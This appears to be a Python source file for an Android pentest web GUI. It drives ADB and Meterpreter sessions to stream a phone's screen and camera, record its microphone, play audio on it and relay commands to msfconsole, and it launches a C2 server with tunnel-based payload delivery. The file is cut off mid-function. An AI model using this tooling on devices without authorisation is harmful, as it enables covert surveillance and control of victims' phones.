#!/usr/bin/env python3
"""
secV Android Pentest GUI
Full-featured web GUI for all android pentest operations.

Launched via android_pentest: set mode gui; run
Standalone: python3 android_gui.py [--port 8897] [--serial <device>]
"""
import argparse, json, os, pty, queue, re, select, shutil, struct, subprocess, sys
import socketserver, threading, time, webbrowser
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse, parse_qs

# ── Globals ────────────────────────────────────────────────────────────────────
_GUI_PORT    = 8897
_C2_PORT     = 8891
_MODULE_DIR  = Path(__file__).parent
_SCRIPT      = _MODULE_DIR / "android_pentest.py"
_C2_SCRIPT   = _MODULE_DIR / "c2_gui.py"
_PYTHON      = sys.executable

_c2_proc:       Optional[subprocess.Popen] = None
_sse_clients:   list = []          # list of queue.Queue, one per SSE connection
_sse_lock       = threading.Lock()
_gui_settings   = {"lhost": "", "lport": "4444", "bore_server": "bore.pub",
                   "nvd_api_key": "", "c2_host": "", "c2_port": "8889"}
_captured_qr:   list = []          # QR strings/ASCII captured from operation output

# ── Multi-session pool ─────────────────────────────────────────────────────────
_sessions:      dict = {}          # session_id → session dict
_sessions_lock  = threading.Lock()
_session_seq    = 0                # monotonic ID counter
# ANSI colour codes cycled per session (32=green,36=cyan,33=yellow,35=magenta,34=blue,…)
_SESSION_COLORS = ["32","36","33","35","34","92","96","93","95","94"]

# ── Media / Meterpreter state ──────────────────────────────────────────────────
_screen_procs: dict = {}         # serial → (adb_proc, ff_proc)
_screen_lock  = threading.Lock()
_cam_relay:   Optional[subprocess.Popen] = None  # proxied webcam proc
_cam_port     = 0
_cam_lock     = threading.Lock()
_mic_chunks:  list = []          # [(path, ts), …]  rolling WAV recordings
_mic_proc:    Optional[subprocess.Popen] = None
_mic_lock     = threading.Lock()
_msf_proc:    Optional[subprocess.Popen] = None  # interactive msfconsole
_msf_clients: list = []          # SSE queues for MSF output
_msf_lock     = threading.Lock()
_msf_out_buf: list = []          # last 500 lines of MSF output

# PTY shell state
_pty_fd:      Optional[int]    = None
_pty_pid:     Optional[int]    = None
_pty_clients: list             = []
_pty_lock                      = threading.Lock()
_pty_buf:     list             = []   # rolling 500-chunk output buffer
_pty_session: int              = 0    # incremented each new PTY start

# ── Broadcast helpers ──────────────────────────────────────────────────────────

def _broadcast(line: str):
    with _sse_lock:
        dead = []
        for q in _sse_clients:
            try:
                q.put_nowait(line)
            except queue.Full:
                dead.append(q)
        for q in dead:
            _sse_clients.remove(q)


def _resize_pty(fd: int, rows: int, cols: int):
    import fcntl, termios
    s = struct.pack("HHHH", rows, cols, 0, 0)
    try:
        fcntl.ioctl(fd, termios.TIOCSWINSZ, s)
    except Exception:
        pass


def _broadcast_pty(chunk: str):
    with _pty_lock:
        _pty_buf.append(chunk)
        if len(_pty_buf) > 500:
            _pty_buf.pop(0)
        dead = []
        for q in _pty_clients:
            try:
                q.put_nowait(chunk)
            except queue.Full:
                dead.append(q)
        for q in dead:
            _pty_clients.remove(q)


def _pty_reader():
    """Background thread — reads PTY fd and broadcasts to SSE clients."""
    global _pty_pid, _pty_fd
    while True:
        with _pty_lock:
            fd = _pty_fd
        if fd is None:
            break
        try:
            r, _, _ = select.select([fd], [], [], 0.05)
            if r:
                data = os.read(fd, 4096)
                if not data:
                    break
                _broadcast_pty(data.decode("utf-8", errors="replace"))
        except OSError:
            break
    with _pty_lock:
        pid = _pty_pid
        _pty_pid = None
        _pty_fd  = None
    if pid:
        try: os.waitpid(pid, os.WNOHANG)
        except Exception: pass
    _broadcast_pty("\r\n\x1b[33m[shell exited]\x1b[0m\r\n")


def _run_session(sid: int, context: dict):
    """Run one android_pentest operation as an independent session."""
    op     = context.get("params", {}).get("operation", "?")
    device = context.get("params", {}).get("device", "")
    color  = _SESSION_COLORS[sid % len(_SESSION_COLORS)]
    prefix = f"\x1b[{color}m[#{sid} {op}]\x1b[0m"

    with _sessions_lock:
        _sessions[sid].update(status="running", pid=None)

    _broadcast(f"{prefix} \x1b[32m[+] starting\x1b[0m")
    status = "error"
    try:
        proc = subprocess.Popen(
            [_PYTHON, str(_SCRIPT)],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT)
        with _sessions_lock:
            _sessions[sid]["proc"] = proc
            _sessions[sid]["pid"]  = proc.pid
        proc.stdin.write(json.dumps(context).encode())
        proc.stdin.close()
        for raw in iter(proc.stdout.readline, b""):
            line = raw.decode(errors="replace").rstrip("\n")
            if line.startswith("\x00RESULT\x00"):
                json_part = line[len("\x00RESULT\x00"):]
                _broadcast(f"__RESULT__:{json_part}")
                with _sessions_lock:
                    if sid in _sessions:
                        _sessions[sid]["result"] = json_part
                continue  # never print raw JSON blob to terminal
            _broadcast(f"{prefix} {line}")
            _maybe_capture_qr(line)
        proc.wait()
        status = "done"
        _broadcast(f"{prefix} \x1b[33m[*] exit {proc.returncode}\x1b[0m")
    except Exception as e:
        _broadcast(f"{prefix} \x1b[31m[!] {e}\x1b[0m")
    finally:
        with _sessions_lock:
            if sid in _sessions:
                _sessions[sid]["status"]  = status
                _sessions[sid]["end_ts"]  = time.time()
                _sessions[sid]["pid"]     = None
                _sessions[sid]["proc"]    = None
        _broadcast(f"\x1b[35m[done:{sid}]\x1b[0m")


def _adb(*args) -> str:
    adb = shutil.which("adb") or "adb"
    try:
        r = subprocess.run([adb] + list(args), capture_output=True, text=True, timeout=10)
        return (r.stdout + r.stderr).strip()
    except Exception as e:
        return str(e)


_qr_buf: list = []
def _maybe_capture_qr(line: str):
    """Buffer consecutive lines that look like ASCII QR art, then store them."""
    stripped = line.strip()
    # detect QR block start/end (dense ░▓█ characters or ▄▀ style)
    if any(c in stripped for c in ("█", "▄", "▀", "░", "▓", "▐", "▌")):
        _qr_buf.append(line)
    else:
        if len(_qr_buf) >= 4:
            _captured_qr.append("\n".join(_qr_buf))
            _broadcast("\x1b[35m[qr-captured]\x1b[0m")
        _qr_buf.clear()
    # also capture QR delivery URLs
    if "bore.pub" in line or "trycloudflare.com" in line:
        m = re.search(r'https?://\S+', line)
        if m:
            _captured_qr.append(f"URL: {m.group()}")
            _broadcast(f"\x1b[35m[qr-url-captured] {m.group()}\x1b[0m")


def _c2_running() -> bool:
    global _c2_proc
    if _c2_proc and _c2_proc.poll() is None:
        return True
    _c2_proc = None
    return False


def _ensure_c2(port: int = _C2_PORT) -> bool:
    global _c2_proc
    if _c2_running():
        return True
    if not _C2_SCRIPT.exists():
        return False
    try:
        _c2_proc = subprocess.Popen(
            [_PYTHON, str(_C2_SCRIPT), "--port", str(port), "--no-browser"],
            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        time.sleep(1.0)
        return _c2_proc.poll() is None
    except Exception:
        return False


# ── HTTP Handler ───────────────────────────────────────────────────────────────

class _Handler(BaseHTTPRequestHandler):

    def log_message(self, *_):
        pass

    # ── routing ──────────────────────────────────────────────────────────────

    def do_GET(self):
        p = urlparse(self.path).path
        if   p == "/" or p == "/index.html":   self._serve_html()
        elif p == "/api/devices":              self._api_devices()
        elif p == "/api/devices/reload":       self._api_devices_reload()
        elif p == "/api/stream":               self._api_sse()
        elif p == "/api/status":               self._api_status()
        elif p == "/api/sessions":             self._api_sessions()
        elif p == "/api/applist":              self._api_applist()
        elif p == "/api/devinfo":              self._api_devinfo()
        elif p == "/api/deps":                 self._api_deps()
        elif p == "/api/workdir":              self._api_workdir()
        elif p == "/api/lhost":                self._api_lhost()
        elif p == "/api/qr":                   self._api_qr()
        elif p == "/api/settings":             self._api_get_settings()
        elif p == "/api/c2/launch":            self._api_c2_launch()
        elif p == "/api/c2/stop":              self._api_c2_stop()
        elif p == "/api/c2/status":            self._api_c2_status()
        elif p == "/api/media/screen":         self._api_screen_stream()
        elif p == "/api/media/screen/snap":    self._api_screen_snap()
        elif p == "/api/media/screen/size":    self._api_screen_size()
        elif p == "/api/media/screen/msf":     self._api_screen_msf()
        elif p == "/api/media/camera/snap":    self._api_camera_snap()
        elif p == "/api/media/camera/stream":  self._api_camera_stream()
        elif p == "/api/media/camera/stream_adb": self._api_camera_stream_adb()
        elif p == "/api/media/camera/list":    self._api_camera_list()
        elif p == "/api/media/camera/stop":    self._api_camera_stop()
        elif p == "/api/media/mic/chunk":      self._api_mic_chunk()
        elif p == "/api/msf/stream":           self._api_msf_sse()
        elif p == "/api/msf/sessions":         self._api_msf_sessions()
        elif p == "/api/pty/stream":           self._api_pty_stream()
        elif p == "/api/proc/stream":          self._api_proc_stream()
        elif p == "/api/proc/list":            self._api_proc_list()
        elif p == "/api/fs/list":             self._api_fs_list()
        elif p == "/api/fs/read":             self._api_fs_read()
        elif p == "/api/fs/download":         self._api_fs_download()
        elif p == "/api/device/fs/list":      self._api_device_fs_list()
        elif p == "/api/device/apk/list":     self._api_device_apk_list()
        else:                                  self._send(404, "text/plain", b"not found")

    def do_POST(self):
        p = urlparse(self.path).path
        if p == "/api/fs/upload":
            self._api_fs_upload(self._read_body_raw()); return
        body = self._read_body()
        if   p == "/api/run":               self._api_run(body)
        elif p == "/api/kill":              self._api_kill()
        elif p == "/api/adb":               self._api_adb(body)
        elif p == "/api/settings":          self._api_settings(body)
        elif p == "/api/media/mic/start":   self._api_mic_start(body)
        elif p == "/api/media/mic/stop":    self._api_mic_stop()
        elif p == "/api/media/mic/msf":     self._api_mic_msf(body)
        elif p == "/api/media/speaker":     self._api_speaker(body)
        elif p == "/api/media/speaker/stop":self._api_speaker_stop(body)
        elif p == "/api/msf/start":         self._api_msf_start(body)
        elif p == "/api/msf/stop":          self._api_msf_stop()
        elif p == "/api/msf/send":          self._api_msf_send(body)
        elif p == "/api/pty/start":         self._api_pty_start(body)
        elif p == "/api/pty/input":         self._api_pty_input(body)
        elif p == "/api/pty/resize":        self._api_pty_resize(body)
        elif p == "/api/pty/kill":          self._api_pty_kill()
        elif p == "/api/fs/delete":         self._api_fs_delete(body)
        elif p == "/api/fs/rename":         self._api_fs_rename(body)
        elif p == "/api/fs/mkdir":          self._api_fs_mkdir(body)
        elif p == "/api/device/fs/pull":    self._api_device_fs_pull(body)
        elif p == "/api/device/fs/push":    self._api_device_fs_push(body)
        elif p == "/api/device/apk/pull":   self._api_device_apk_pull(body)
        elif p == "/api/apk/decompile":     self._api_apk_decompile(body)
        elif p == "/api/apk/recompile":     self._api_apk_recompile(body)
        else:                               self._send(404, "text/plain", b"not found")

    def do_OPTIONS(self):
        self.send_response(200)
        self._cors()
        self.end_headers()

    # ── helpers ───────────────────────────────────────────────────────────────

    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def _send(self, code: int, ct: str, body: bytes):
        self.send_response(code)
        self.send_header("Content-Type", ct)
        self._cors()
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _json(self, data):
        self._send(200, "application/json", json.dumps(data).encode())

    def _read_body(self) -> dict:
        length = int(self.headers.get("Content-Length", 0))
        raw    = self.rfile.read(length) if length else b"{}"
        try:    return json.loads(raw)
        except: return {}

    def _read_body_raw(self) -> bytes:
        length = int(self.headers.get("Content-Length", 0))
        return self.rfile.read(length) if length else b""

    # ── endpoints ─────────────────────────────────────────────────────────────

    def _api_devices(self):
        out  = _adb("devices", "-l")
        devs = []
        for line in out.splitlines()[1:]:
            line = line.strip()
            if not line or "offline" in line: continue
            parts = line.split()
            if len(parts) < 2: continue
            serial = parts[0]
            state  = parts[1]
            info   = {"serial": serial, "tags": " ".join(parts[2:]), "state": state}
            if state == "unauthorized":
                info["label"]  = f"{serial} (tap Allow on device)"
                info["status"] = "unauthorized"
            elif state == "device":
                info["status"] = "authorized"
                # enrich with model info
                try:
                    raw = _adb("-s", serial, "shell",
                               "getprop ro.product.brand; getprop ro.product.model; "
                               "getprop ro.build.version.release; getprop ro.build.version.sdk")
                    lines = [x.strip() for x in raw.splitlines() if x.strip()]
                    if len(lines) >= 2:
                        info["brand"]   = lines[0]
                        info["model"]   = lines[1]
                        info["android"] = lines[2] if len(lines) > 2 else ""
                        info["sdk"]     = lines[3] if len(lines) > 3 else ""
                        info["label"]   = f"{lines[0]} {lines[1]}"
                except Exception:
                    pass
            else:
                continue
            devs.append(info)
        self._json({"devices": devs})

    def _api_devices_reload(self):
        """Kill and restart ADB server, wait for devices to re-enumerate, return fresh list."""
        import time as _time
        _adb("kill-server")
        _time.sleep(0.6)
        _adb("start-server")
        # wait up to 4s for at least one device to reappear
        for _ in range(8):
            _time.sleep(0.5)
            out = _adb("devices")
            if out.count("\tdevice") > 0:
                break
        self._api_devices()

    # ── MEDIA: Screen ─────────────────────────────────────────────────────────

    def _api_screen_snap(self):
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        prefix = (["-s", serial] if serial else [])
        adb    = shutil.which("adb") or "adb"
        r = subprocess.run([adb] + prefix + ["exec-out", "screencap", "-p"],
                           capture_output=True, timeout=5)
        if r.returncode == 0 and r.stdout:
            self.send_response(200)
            self.send_header("Content-Type", "image/png")
            self.send_header("Content-Length", str(len(r.stdout)))
            self._cors()
            self.end_headers()
            self.wfile.write(r.stdout)
        else:
            self._json({"ok": False, "error": "screencap failed"})

    def _api_screen_stream(self):
        global _screen_procs
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        adb    = shutil.which("adb") or "adb"
        ff     = shutil.which("ffmpeg")
        prefix = (["-s", serial] if serial else [])

        self.send_response(200)
        self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=secvframe")
        self.send_header("Cache-Control", "no-cache, no-store")
        self.send_header("Connection", "close")
        self._cors()
        self.end_headers()

        BOUNDARY = b"--secvframe\r\nContent-Type: image/jpeg\r\n\r\n"

        if ff:
            # H.264 pipeline → ffmpeg → JPEG frames
            try:
                adb_p = subprocess.Popen(
                    [adb] + prefix + ["exec-out", "screenrecord",
                                      "--output-format=h264", "--time-limit=0", "-"],
                    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
                ff_p = subprocess.Popen(
                    [ff, "-loglevel", "quiet", "-i", "pipe:0",
                     "-vf", "fps=15,scale=-2:720",
                     "-f", "image2pipe", "-vcodec", "mjpeg", "-q:v", "3", "pipe:1"],
                    stdin=adb_p.stdout, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
                with _screen_lock:
                    _screen_procs[serial or "__default__"] = (adb_p, ff_p)
                buf = b""
                while True:
                    chunk = ff_p.stdout.read(8192)
                    if not chunk:
                        break
                    buf += chunk
                    while True:
                        soi = buf.find(b"\xff\xd8")
                        if soi == -1: break
                        eoi = buf.find(b"\xff\xd9", soi + 2)
                        if eoi == -1: break
                        frame = buf[soi:eoi + 2]
                        buf   = buf[eoi + 2:]
                        try:
                            self.wfile.write(BOUNDARY + frame + b"\r\n")
                            self.wfile.flush()
                        except (BrokenPipeError, ConnectionResetError):
                            return
            except Exception:
                pass
            finally:
                for p in (adb_p, ff_p):
                    try: p.terminate()
                    except: pass
                with _screen_lock:
                    _screen_procs.pop(serial or "__default__", None)
        else:
            # Screencap loop fallback (PNG, ~5fps)
            while True:
                try:
                    r = subprocess.run(
                        [adb] + prefix + ["exec-out", "screencap", "-p"],
                        capture_output=True, timeout=4)
                    if r.returncode != 0 or not r.stdout:
                        time.sleep(0.5)
                        continue
                    # PNG → serve as JPEG boundary (browsers accept PNG in MJPEG)
                    hdr = (b"--secvframe\r\n"
                           b"Content-Type: image/png\r\n\r\n")
                    self.wfile.write(hdr + r.stdout + b"\r\n")
                    self.wfile.flush()
                    time.sleep(0.18)
                except (BrokenPipeError, ConnectionResetError):
                    break
                except Exception:
                    time.sleep(0.3)

    # ── MEDIA: Camera ──────────────────────────────────────────────────────────

    def _api_camera_list(self):
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        prefix = (["-s", serial] if serial else [])
        adb    = shutil.which("adb") or "adb"
        # list camera IDs via camera2 API dump
        out = subprocess.run(
            [adb] + prefix + ["shell", "cmd", "media.camera", "get-camera-info"],
            capture_output=True, text=True, timeout=6).stdout
        cameras = []
        for line in out.splitlines():
            if "Camera" in line and "id" in line.lower():
                cameras.append(line.strip())
        if not cameras:
            # fallback: check /dev/video*
            dev = subprocess.run(
                [adb] + prefix + ["shell", "ls", "/dev/video*"],
                capture_output=True, text=True, timeout=4).stdout
            cameras = [l.strip() for l in dev.splitlines() if l.strip()]
        self._json({"cameras": cameras or ["camera0", "camera1"]})

    def _api_camera_snap(self):
        """Single camera frame via Meterpreter webcam_snap or ADB intent."""
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        cam_id = (qs.get("id") or ["0"])[0]
        prefix = (["-s", serial] if serial else [])
        adb    = shutil.which("adb") or "adb"
        # Use ADB screencap of camera preview via intent
        snap_path = f"/sdcard/secv_cam_{cam_id}.jpg"
        subprocess.run(
            [adb] + prefix + ["shell",
             f"am start -a android.media.action.STILL_IMAGE_CAMERA; sleep 1; screencap -p > {snap_path}"],
            timeout=6, capture_output=True)
        time.sleep(1.2)
        r = subprocess.run(
            [adb] + prefix + ["exec-out", "cat", snap_path],
            capture_output=True, timeout=5)
        if r.returncode == 0 and r.stdout:
            self.send_response(200)
            self.send_header("Content-Type", "image/png")
            self.send_header("Content-Length", str(len(r.stdout)))
            self._cors(); self.end_headers()
            self.wfile.write(r.stdout)
        else:
            self._json({"ok": False, "error": "camera snap failed — ensure Meterpreter session active"})

    def _api_camera_stream(self):
        """Relay Meterpreter webcam MJPEG stream (started externally via webcam_stream cmd)."""
        global _cam_relay, _cam_port
        qs   = parse_qs(urlparse(self.path).query)
        port = int((qs.get("port") or [str(_cam_port or 8880)])[0])
        # proxy the local MJPEG server that meterpreter started
        import http.client as _hc
        try:
            conn = _hc.HTTPConnection("127.0.0.1", port, timeout=5)
            conn.request("GET", "/")
            resp = conn.getresponse()
            ct = resp.getheader("Content-Type", "multipart/x-mixed-replace; boundary=--")
            self.send_response(200)
            self.send_header("Content-Type", ct)
            self.send_header("Cache-Control", "no-cache")
            self._cors(); self.end_headers()
            while True:
                chunk = resp.read(4096)
                if not chunk: break
                try:
                    self.wfile.write(chunk); self.wfile.flush()
                except (BrokenPipeError, ConnectionResetError):
                    break
        except Exception as e:
            self._json({"ok": False, "error": str(e),
                        "hint": "Start webcam_stream in Meterpreter first"})

    def _api_camera_stop(self):
        global _cam_relay
        with _cam_lock:
            if _cam_relay:
                try: _cam_relay.terminate()
                except: pass
                _cam_relay = None
        self._json({"ok": True})

    def _api_camera_stream_adb(self):
        """ADB-native camera stream: force-open camera app then screencap loop."""
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        cam_id = (qs.get("id") or ["0"])[0]
        prefix = (["-s", serial] if serial else [])
        adb    = shutil.which("adb") or "adb"
        ff     = shutil.which("ffmpeg")

        # launch camera app on device
        pkg = "com.android.camera2" if cam_id == "0" else "com.android.camera"
        subprocess.run([adb] + prefix + ["shell",
            f"am start -a android.media.action.STILL_IMAGE_CAMERA 2>/dev/null || "
            f"am start -n {pkg}/.Camera 2>/dev/null || true"],
            capture_output=True, timeout=5)
        time.sleep(0.8)

        self.send_response(200)
        self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=secvframe")
        self.send_header("Cache-Control", "no-cache, no-store")
        self.send_header("Connection", "close")
        self._cors()
        self.end_headers()

        BOUNDARY = b"--secvframe\r\nContent-Type: image/png\r\n\r\n"
        while True:
            try:
                r = subprocess.run(
                    [adb] + prefix + ["exec-out", "screencap", "-p"],
                    capture_output=True, timeout=4)
                if r.returncode != 0 or not r.stdout:
                    time.sleep(0.3); continue
                self.wfile.write(BOUNDARY + r.stdout + b"\r\n")
                self.wfile.flush()
                time.sleep(0.15)
            except (BrokenPipeError, ConnectionResetError):
                break
            except Exception:
                time.sleep(0.3)

    # ── MEDIA: Screen size + MSF screenshot ───────────────────────────────────

    def _api_screen_size(self):
        """Return physical display size via adb wm size."""
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        prefix = (["-s", serial] if serial else [])
        adb    = shutil.which("adb") or "adb"
        try:
            out = subprocess.run(
                [adb] + prefix + ["shell", "wm", "size"],
                capture_output=True, text=True, timeout=5).stdout
            import re
            m = re.search(r"Physical size:\s*(\d+)x(\d+)", out)
            if not m:
                m = re.search(r"(\d+)x(\d+)", out)
            if m:
                w, h = int(m.group(1)), int(m.group(2))
                self._json({"ok": True, "width": w, "height": h,
                            "aspect": f"{w}/{h}"})
                return
        except Exception:
            pass
        self._json({"ok": False, "width": 1080, "height": 2400})

    def _api_screen_msf(self):
        """Take a screenshot via Meterpreter and return the PNG bytes."""
        qs       = parse_qs(urlparse(self.path).query)
        session  = (qs.get("session") or ["1"])[0]
        work_dir = Path.home() / ".secv" / "android" / "msf_screens"
        work_dir.mkdir(parents=True, exist_ok=True)
        msfc = shutil.which("msfconsole")
        if not msfc:
            self._json({"ok": False, "error": "msfconsole not found"}); return
        out_file = str(work_dir / f"screen_{int(time.time())}.png")
        rc = (
            f"sessions -i {session}\n"
            f"screenshot -p {out_file}\n"
            f"exit\n"
        )
        rc_file = str(work_dir / "snap.rc")
        Path(rc_file).write_text(rc)
        try:
            subprocess.run(
                [msfc, "-q", "-r", rc_file],
                capture_output=True, timeout=20)
        except Exception as e:
            self._json({"ok": False, "error": str(e)}); return
        if Path(out_file).exists():
            data = Path(out_file).read_bytes()
            self.send_response(200)
            self.send_header("Content-Type", "image/png")
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Cache-Control", "no-cache")
            self._cors(); self.end_headers()
            self.wfile.write(data)
        else:
            self._json({"ok": False, "error": "screenshot not found — ensure session is active"})

    # ── MEDIA: Microphone ──────────────────────────────────────────────────────

    def _api_mic_start(self, body: dict):
        global _mic_proc, _mic_chunks
        serial   = body.get("device", "")
        duration = int(body.get("duration", 4))
        lhost    = body.get("lhost") or _gui_settings.get("lhost", "")
        lport    = int(body.get("lport", 4444))
        prefix   = (["-s", serial] if serial else [])
        adb      = shutil.which("adb") or "adb"
        work_dir = Path.home() / ".secv" / "android" / "media"
        work_dir.mkdir(parents=True, exist_ok=True)

        def _record_loop():
            global _mic_proc
            idx = 0
            while True:
                with _mic_lock:
                    if _mic_proc is None:
                        break
                wav = str(work_dir / f"mic_{idx:04d}.wav")
                dev_path = f"/sdcard/secv_mic_{idx}.wav"
                # record via ADB + Android's tinycap or toybox
                r = subprocess.run(
                    [adb] + prefix + ["shell",
                     f"am startservice --user 0 -n com.android.soundrecorder/.SoundRecorderService 2>/dev/null; "
                     f"sleep {duration}; am stopservice -n com.android.soundrecorder/.SoundRecorderService 2>/dev/null"],
                    timeout=duration + 4, capture_output=True)
                # fallback: pull via screenrecord audio channel isn't available — use ADB exec-out of /dev/audio
                # simpler: use `adb shell` + `tinymix`/`tinycap` if present
                tinycap = subprocess.run(
                    [adb] + prefix + ["shell", f"tinycap /sdcard/secv_mic_{idx}.wav {duration} 2>/dev/null || "
                                              f"toybox tinycap /sdcard/secv_mic_{idx}.wav {duration} 2>/dev/null"],
                    timeout=duration + 6, capture_output=True)
                # pull file
                p = subprocess.run(
                    [adb] + prefix + ["pull", dev_path, wav],
                    capture_output=True, timeout=8)
                if p.returncode == 0 and Path(wav).exists():
                    with _mic_lock:
                        _mic_chunks.append((wav, time.time()))
                        if len(_mic_chunks) > 30:
                            _mic_chunks.pop(0)
                idx += 1
                time.sleep(0.1)

        with _mic_lock:
            _mic_proc = True   # sentinel to signal running
        t = threading.Thread(target=_record_loop, daemon=True)
        t.start()
        self._json({"ok": True, "msg": f"Microphone capture started ({duration}s chunks)"})

    def _api_mic_stop(self):
        global _mic_proc
        with _mic_lock:
            _mic_proc = None
        self._json({"ok": True})

    def _api_mic_chunk(self):
        """Serve the latest mic recording as WAV."""
        with _mic_lock:
            if not _mic_chunks:
                self._json({"ok": False, "error": "no recording yet"})
                return
            path, _ = _mic_chunks[-1]
        try:
            data = Path(path).read_bytes()
            self.send_response(200)
            self.send_header("Content-Type", "audio/wav")
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Cache-Control", "no-cache")
            self._cors(); self.end_headers()
            self.wfile.write(data)
        except Exception as e:
            self._json({"ok": False, "error": str(e)})

    def _api_mic_msf(self, body: dict):
        """Trigger record_mic via active Meterpreter session and return WAV."""
        session  = str(body.get("session", "1"))
        duration = int(body.get("duration", 5))
        work_dir = Path.home() / ".secv" / "android" / "media"
        work_dir.mkdir(parents=True, exist_ok=True)
        msfc = shutil.which("msfconsole")
        if not msfc:
            self._json({"ok": False, "error": "msfconsole not found"}); return
        out_file = str(work_dir / f"mic_msf_{int(time.time())}.wav")
        rc = (
            f"sessions -i {session}\n"
            f"record_mic -d {duration} -f {out_file}\n"
            f"exit\n"
        )
        rc_file = str(work_dir / "mic.rc")
        Path(rc_file).write_text(rc)
        try:
            subprocess.run([msfc, "-q", "-r", rc_file],
                           capture_output=True, timeout=duration + 15)
        except Exception as e:
            self._json({"ok": False, "error": str(e)}); return
        if Path(out_file).exists():
            with _mic_lock:
                _mic_chunks.append((out_file, time.time()))
                if len(_mic_chunks) > 30:
                    _mic_chunks.pop(0)
            self._json({"ok": True, "path": out_file})
        else:
            self._json({"ok": False, "error": "recording not saved — check MSF session"})

    # ── MEDIA: Speaker ─────────────────────────────────────────────────────────

    def _api_speaker(self, body: dict):
        """Push a base64-encoded audio file to the device and play it."""
        import base64
        serial  = body.get("device", "")
        b64     = body.get("data", "")
        ext     = body.get("ext", "mp3")
        prefix  = (["-s", serial] if serial else [])
        adb     = shutil.which("adb") or "adb"
        if not b64:
            self._json({"ok": False, "error": "no audio data"}); return
        try:
            audio = base64.b64decode(b64)
        except Exception:
            self._json({"ok": False, "error": "invalid base64"}); return
        tmp = Path("/tmp") / f"secv_spk_{int(time.time())}.{ext}"
        tmp.write_bytes(audio)
        dev_path = f"/sdcard/secv_spk.{ext}"
        subprocess.run([adb] + prefix + ["push", str(tmp), dev_path],
                       capture_output=True, timeout=10)
        mime = "audio/mpeg" if ext == "mp3" else "audio/wav"
        subprocess.run(
            [adb] + prefix + ["shell",
             f"am start -a android.intent.action.VIEW "
             f"-d file://{dev_path} -t {mime}"],
            capture_output=True, timeout=5)
        self._json({"ok": True, "path": dev_path})

    def _api_speaker_stop(self, body: dict):
        """Stop audio playback on device."""
        serial = body.get("device", "")
        prefix = (["-s", serial] if serial else [])
        adb    = shutil.which("adb") or "adb"
        for pkg in ("com.android.music", "com.google.android.music",
                    "com.spotify.music", "com.android.soundrecorder"):
            subprocess.run([adb] + prefix + ["shell", f"am force-stop {pkg}"],
                           capture_output=True, timeout=5)
        # also stop via media button broadcast
        subprocess.run([adb] + prefix + ["shell",
            "input keyevent KEYCODE_MEDIA_STOP 2>/dev/null || true"],
            capture_output=True, timeout=4)
        self._json({"ok": True})

    # ── MSF Meterpreter console ────────────────────────────────────────────────

    def _api_msf_start(self, body: dict):
        global _msf_proc, _msf_out_buf
        if _msf_proc and _msf_proc.poll() is None:
            self._json({"ok": True, "msg": "already running"}); return
        msfc = shutil.which("msfconsole")
        if not msfc:
            self._json({"ok": False, "error": "msfconsole not found"}); return
        _msf_out_buf = []
        init_cmd = body.get("init", "")

        def _reader():
            global _msf_proc
            for raw in iter(_msf_proc.stdout.readline, b""):
                line = raw.decode(errors="replace").rstrip("\n")
                if line.startswith("stty:"):           # suppress terminal noise
                    continue
                with _msf_lock:
                    _msf_out_buf.append(line)
                    if len(_msf_out_buf) > 500:
                        _msf_out_buf.pop(0)
                    for q in list(_msf_clients):
                        try: q.put_nowait(line)
                        except queue.Full: pass

        env = os.environ.copy()
        env["TERM"] = "xterm-256color"
        _msf_proc = subprocess.Popen(
            [msfc, "-q"],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, env=env)
        threading.Thread(target=_reader, daemon=True).start()
        if init_cmd:
            time.sleep(2.5)
            try:
                for cmd in init_cmd.split(";"):
                    cmd = cmd.strip()
                    if cmd:
                        _msf_proc.stdin.write((cmd + "\n").encode())
                        _msf_proc.stdin.flush()
                        time.sleep(0.12)
            except Exception: pass
        self._json({"ok": True})

    def _api_msf_stop(self):
        global _msf_proc
        if _msf_proc:
            try: _msf_proc.terminate()
            except: pass
            _msf_proc = None
        self._json({"ok": True})

    def _api_msf_send(self, body: dict):
        global _msf_proc
        cmd = body.get("cmd", "")
        if not _msf_proc or _msf_proc.poll() is not None:
            self._json({"ok": False, "error": "msfconsole not running"}); return
        try:
            _msf_proc.stdin.write((cmd + "\n").encode())
            _msf_proc.stdin.flush()
            self._json({"ok": True})
        except Exception as e:
            self._json({"ok": False, "error": str(e)})

    def _api_msf_sse(self):
        q = queue.Queue(maxsize=500)
        with _msf_lock:
            _msf_clients.append(q)
            history = list(_msf_out_buf)
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Cache-Control", "no-cache")
        self.send_header("Connection", "keep-alive")
        self._cors(); self.end_headers()
        try:
            # replay history
            for line in history:
                self.wfile.write(f"data: {line}\n\n".encode()); self.wfile.flush()
            while True:
                try:
                    line = q.get(timeout=15)
                    self.wfile.write(f"data: {line}\n\n".encode()); self.wfile.flush()
                except queue.Empty:
                    self.wfile.write(b": ping\n\n"); self.wfile.flush()
        except (BrokenPipeError, ConnectionResetError):
            pass
        finally:
            with _msf_lock:
                try: _msf_clients.remove(q)
                except ValueError: pass

    def _api_msf_sessions(self):
        global _msf_out_buf
        with _msf_lock:
            buf = "\n".join(_msf_out_buf[-100:])
        sessions = []
        for line in buf.splitlines():
